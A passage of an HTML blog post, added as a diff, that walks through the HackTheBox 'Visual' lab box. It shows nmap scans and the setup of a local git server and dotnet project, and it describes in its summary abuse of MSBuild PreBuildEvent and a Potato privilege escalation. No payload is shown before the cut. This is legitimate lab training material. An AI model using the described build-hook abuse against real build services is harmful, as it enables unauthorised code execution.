@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Visual&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Visual">
+  
+    <meta name="description" content="This is an interesting box themed around .NET projects. The web application clones a user-provided git repository and attempts to build the project. Here, the PreBuildEvent property in MSBuild can be abused for running malicious OS commands and gaining a foothold on the box. For privilege escalation, I’ll recover default privileges for a service account, then exploit SeImpersonatePrivilege with a Potato attack.">
+    <meta property="og:description" content="This is an interesting box themed around .NET projects. The web application clones a user-provided git repository and attempts to build the project. Here, the PreBuildEvent property in MSBuild can be abused for running malicious OS commands and gaining a foothold on the box. For privilege escalation, I’ll recover default privileges for a service account, then exploit SeImpersonatePrivilege with a Potato attack.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/a75ac8ed04e6e728547538bfa41cfc68.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/a75ac8ed04e6e728547538bfa41cfc68.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Visual</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Feb 25, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
+            <a href="tag/Medium">Medium</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/d0aa06fa089342198d41a6e89f6196d3" class="PageRoot"><h3 id="https://www.notion.so/6a5271ee64a84525bd5f52747dd68ae8" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/6a5271ee64a84525bd5f52747dd68ae8"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/295bde1881fe4079999510ea5c2fe8c7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This is an interesting box themed around .NET projects. The web application clones a user-provided git repository and attempts to build the project. Here, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PreBuildEvent</code></span><span class="SemanticString"> property in MSBuild can be abused for running malicious OS commands and gaining a foothold on the box. For privilege escalation, I’ll recover default privileges for a service account, then exploit </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeImpersonatePrivilege</code></span><span class="SemanticString"> with a Potato attack.</span></span></p></div><div id="https://www.notion.so/b3014284231346f6bba9b9619c6cfe1b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/8757d53d005f44a49424cb12b123d8d3" class="Divider"></div><h3 id="https://www.notion.so/13f28e1155764f58b83d07d6677596a9" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/13f28e1155764f58b83d07d6677596a9"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/7ebee8437da548b6bff87214f40228d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/dade333f310a4bf5a9e44d69afe10305" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(chengw㉿DESKTOP-P7M2COB)-[~/machines/visual/enumeration/nmap]
+└─$</span></mark></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorDefault"><span> sudo nmap --min-rate 1000 -p- 10.129.229.122</span></mark></span><span class="SemanticString"><span>
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-03 16:52 ACDT
+Nmap scan report for 10.129.229.122
+Host is up (0.33s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 133.23 seconds
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(chengw㉿DESKTOP-P7M2COB)-[~/machines/visual/enumeration/nmap]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 80 10.129.229.122
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-03 16:58 ACDT
+Nmap scan report for 10.129.229.122
+Host is up (0.26s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+|_http-title: Visual - Revolutionizing Visual Studio Builds
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019 (89%)
+Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   260.67 ms 10.10.14.1
+2   261.90 ms 10.129.229.122
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.89 seconds</span></span></span></code></pre><div id="https://www.notion.so/ce8853986c774ebdbec8358aa230dd9b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Nmap only found port 80 open, which is quite unusual for a Windows machine. The aggressive scan also reveals that it’s running a PHP web application.</span></span></p></div><div id="https://www.notion.so/1b0e418259114632a31637941fd0cc66" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5616c35cb1f545a7b029532703f70ec8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/d2c62cdadf5746d2921610222f75b0a6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The web app seems to be an online builder for Visual Studio projects. It takes a git repository URL and returns the compiled binaries and DLLs.</span></span></p></div><div id="https://www.notion.so/b812ac92a567497f8261a8285f794ab4" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F940d58c8-014a-4c2a-aebd-a99441fb1317%2FUntitled.png?width=1915&amp;table=block&amp;id=b812ac92-a567-497f-8261-a8285f794ab4"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F940d58c8-014a-4c2a-aebd-a99441fb1317%2FUntitled.png?width=1915&amp;table=block&amp;id=b812ac92-a567-497f-8261-a8285f794ab4" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c181ce226ade44a9a393f80d2cdba819" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a quick test, I started a simple Python HTTP server and sent the URL to the web app to see what’s going to happen.</span></span></p></div><div id="https://www.notion.so/1ab33a5691214c079a2b3ccf0e74b230" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8b1f8543-3080-4725-8d7d-6b43f09b8451%2FUntitled.png?width=589&amp;table=block&amp;id=1ab33a56-9121-4c07-9a2b-3ccf0e74b230"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8b1f8543-3080-4725-8d7d-6b43f09b8451%2FUntitled.png?width=589&amp;table=block&amp;id=1ab33a56-9121-4c07-9a2b-3ccf0e74b230" style="width:589px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/6c12e1ace1ea4a4aa9436189c0d3c12d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The loading time is rather long, and the page regularly reloads, seemingly checking the build status from the server.</span></span></p></div><div id="https://www.notion.so/db11273a78e14d9680c48f7e6b2e0b8f" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5ac37aeb-35ef-49aa-9967-397c48784a66%2FUntitled.png?width=794&amp;table=block&amp;id=db11273a-78e1-4d96-80c4-8f7e6b2e0b8f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5ac37aeb-35ef-49aa-9967-397c48784a66%2FUntitled.png?width=794&amp;table=block&amp;id=db11273a-78e1-4d96-80c4-8f7e6b2e0b8f" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/6d2ad7feacb949989c805936d24938bd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On my HTTP server, it logged a GET request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/info/refs?service=git-upload-pack</code></span><span class="SemanticString">. This request is for gathering the necessary git objects such as commits and trees, and is typically used in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">git fetch</code></span><span class="SemanticString"> or </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">git clone</code></span><span class="SemanticString"> operations, according to the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://git-scm.com/docs/http-protocol#_smart_service_git_upload_pack">docs</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/7f24d146f35a4015b52463b6cadd75c7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.229.122 - - [03/Feb/2024 16:55:17] code 404, message File not found
+10.129.229.122 - - [03/Feb/2024 16:55:17] &quot;GET /info/refs?service=git-upload-pack HTTP/1.1&quot; 404 -</span></span></span></code></pre><div id="https://www.notion.so/f69a9c235083483da69f3975305c263d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The server responded with a 404, since it’s not setup as a git server, and doesn’t know what this endpoint is. As expected, the app returned an error shortly afterwards, complaining that the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.sln</code></span><span class="SemanticString"> file wasn’t found.</span></span></p></div><div id="https://www.notion.so/d566eafb790146779350cffedde2e198" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc8cf78bc-b41e-4bc8-9dea-0bbf84ff6455%2FUntitled.png?width=872&amp;table=block&amp;id=d566eafb-7901-4677-9350-cffedde2e198"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc8cf78bc-b41e-4bc8-9dea-0bbf84ff6455%2FUntitled.png?width=872&amp;table=block&amp;id=d566eafb-7901-4677-9350-cffedde2e198" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/5550fecbef084e3fbbf9e2b4a0273036" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/94467a5bf8e0402b8f61993908577a02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Setting up a Git Server:</strong></span></span></p></div><div id="https://www.notion.so/2a59dd8d540a484eb7d39d42df9b3e22" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After some research on how to set up a local git server, I found </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/qhzhyt/http-git-server">this</a></span><span class="SemanticString">, which is a simple git server implemented in Python Flask, and does not require any additional configurations and installations.</span></span></p></div><div id="https://www.notion.so/cf164ad348364240a59a4f598289a19f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ git clone https://github.com/qhzhyt/http-git-server.git &amp;&amp; cd http-git-server</code></span></span></p></div><div id="https://www.notion.so/8f84c9e5e57a4503b7380bd0473f0ea4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at the code, it’s expecting all the git repositories placed inside a directory called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">repos</code></span><span class="SemanticString">. I’ll have to create this myself.</span></span></p></div><pre id="https://www.notion.so/9e6d34b969714ab5a80ce68aef9be32e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../visual/exploitation/http-git-server]
+└─$</span></mark></span><span class="SemanticString"><span> mkdir repos &amp;&amp; cd repos</span></span></span></code></pre><div id="https://www.notion.so/93ae92e7bbbf4d9e9cf439498db4e7db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll also create a folder for the test repository.</span></span></p></div><pre id="https://www.notion.so/de3ed36e51584642a8d1752d8f899dfc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../exploitation/http-git-server/repos]
+└─$</span></mark></span><span class="SemanticString"><span> mkdir test.git &amp;&amp; cd test.git</span></span></span></code></pre><div id="https://www.notion.so/6eedd56aa80241d093687b72b495ae39" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In here is where we place the project files. If you create a project with Visual Studio, these files gets generated automatically. Since I don’t have VS available on my Kali, I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dotnet</code></span><span class="SemanticString"> to create a skeleton console project instead.</span></span></p></div><pre id="https://www.notion.so/2756f5abd8da4a21a3953bf25c741d36" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/test.git]
+└─$</span></mark></span><span class="SemanticString"><span> dotnet new console -n test &amp;&amp; dotnet new sln -n test &amp;&amp; dotnet sln add test/test.csproj
+
+The template &quot;Console App&quot; was created successfully.
+
+Processing post-creation actions...
+Running &#x27;dotnet restore&#x27; on /home/chengw/Desktop/hack/lab/machines/visual/http-git-server/repos/test/test.csproj...
+  Determining projects to restore...
+  Restored /home/chengw/Desktop/hack/lab/machines/visual/http-git-server/repos/test.git/test/test.csproj (in 80 ms).
+Restore succeeded.
+
+
+The template &quot;Solution File&quot; was created successfully.
+
+Project `test/test.csproj` added to the solution.</span></span></span></code></pre><div id="https://www.notion.so/af60cd4cc6a94b21ad73471bc485db88" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now, a file </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">test.sln</code></span><span class="SemanticString"> and a folder </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">test</code></span><span class="SemanticString"> are created.</span></span></p></div><pre id="https://www.notion.so/cef8b63d27dd4226b5e98d4230e84549" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/test.git]
+└─$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 16
+drwxr-xr-x 3 chengw chengw 4096 Feb  3 17:08 .
+drwxr-xr-x 3 chengw chengw 4096 Feb  3 17:08 ..
+drwxr-xr-x 3 chengw chengw 4096 Feb  3 17:08 test
+-rw-r--r-- 1 chengw chengw  989 Feb  3 17:08 test.sln</span></span></span></code></pre><div id="https://www.notion.so/86bbfd4df92343b286f3176d8a411502" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Inside </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">test</code></span><span class="SemanticString"> is the Program file in C#, as well as the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.csproj</code></span><span class="SemanticString"> file that specifies the project configurations.</span></span></p></div><pre id="https://www.notion.so/60652e9ce61a46878d4b06a23eac62f7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/test.git]
+└─$</span></mark></span><span class="SemanticString"><span> ls -la test
+
+total 20
+drwxr-xr-x 3 chengw chengw 4096 Feb  3 17:08 .
+drwxr-xr-x 3 chengw chengw 4096 Feb  3 17:08 ..
+drwxr-xr-x 2 chengw chengw 4096 Feb  3 17:08 obj
+-rw-r--r-- 1 chengw chengw  105 Feb  3 17:08 Program.cs
+-rw-r--r-- 1 chengw chengw  249 Feb  3 17:08 test.csproj</span></span></span></code></pre><div id="https://www.notion.so/bfda36632da44a6089390c82115b0d0d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With all the necessary files created, I’ll put the directory under git control:</span></span></p></div><pre id="https://www.notion.so/c149cff02e3846ef9847fe7c2a690fc0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/test.git]
+└─$</span></mark></span><span class="SemanticString"><span> git init
+
+hint: Using &#x27;master&#x27; as the name for the initial branch. This default branch name
+hint: is subject to change. To configure the initial branch name to use in all
+hint: of your new repositories, which will suppress this warning, call:
+hint: 
+hint: 	git config --global init.defaultBranch &lt;name&gt;
+hint: 
+hint: Names commonly chosen instead of &#x27;master&#x27; are &#x27;main&#x27;, &#x27;trunk&#x27; and
+hint: &#x27;development&#x27;. The just-created branch can be renamed via this command:
+hint: 
+hint: 	git branch -m &lt;name&gt;
+Initialized empty Git repository in /home/chengw/Desktop/hack/lab/machines/visual/http-git-server/repos/test.git/.git/</span></span></span></code></pre><div id="https://www.notion.so/8c4aa6179c3b4d32a1e99c19210f191b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And commit all the files in:</span></span></p></div><pre id="https://www.notion.so/9d6d62bc7b4a44f2bcd33cfd159de103" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../http-git-server/repos/test.git]
+└─$</span></mark></span><span class="SemanticString"><span> git add * &amp;&amp; git commit -m &#x27;init&#x27;
+
+[master (root-commit) dca3433] init
+ 8 files changed, 218 insertions(+)
+ create mode 100644 test.sln
+ create mode 100644 test/Program.cs
+ create mode 100644 test/obj/project.assets.json
+ create mode 100644 test/obj/project.nuget.cache
+ create mode 100644 test/obj/test.csproj.nuget.dgspec.json
+ create mode 100644 test/obj/test.csproj.nuget.g.props
+ create mode 100644 test/obj/test.csproj.nuget.g.targets
+ create mode 100644 test/test.csproj</span></span></span></code></pre><div id="https://www.notion.so/2e123af113024e509544f790df707cdc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now I can start the git server:</span></span></p></div><pre id="https://www.notion.so/cc37a13cd51a4c9492a7c8f5fb2ce4ce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/../visual/exploitation/http-git-server]
+└─$</span></mark></span><span class="SemanticString"><span> python server.py</span></span></span></code></pre><div id="https://www.notion.so/f316cfaaad3d40b9baaa2f7221600e3a" class="ColorfulBlock ColorfulBlock--BgGray Callout"><div class="Callout__Icon"><div class="Icon">💡</div></div><p class="Callout__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Note:</strong></span><span class="SemanticString"> The server starts on port 8080 by default. It may fail to start if you also have Burp running on the same port. You can edit </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">config.py</code></span><span class="SemanticString"> to change the port if you want Burp running at the same time.</span></span></p></div><div id="https://www.notion.so/9c89a1636f524ee09e8dc7fca041ffa3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally, I sent the git repository link to the web app:</span></span></p></div><div id="https://www.notion.so/54328a5851e946d894221ab28cd3722f" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fbd0c1d0a-23c8-4ff3-9064-3cdd3fbe9768%2FUntitled.png?width=483&amp;table=block&amp;id=54328a58-51e9-46d8-9422-1ab28cd3722f"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fbd0c1d0a-23c8-4ff3-9064-3cdd3fbe9768%2FUntitled.png?width=483&amp;table=block&amp;id=54328a58-51e9-46d8-9422-1ab28cd3722f" style="width:483px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e743bcde183f4655b6664d1b946f70af" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This time, a GET request and a POST request are logged in the git server, both returning 200 status.</span></span></p></div><pre id="https://www.notion.so/918508c3d75743198c8b66bd910d046e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.129.229.122 - - [2024-02-03 17:14:50] &quot;GET /test.git/info/refs?service=git-upload-pack HTTP/1.1&quot; 200 506 0.004807
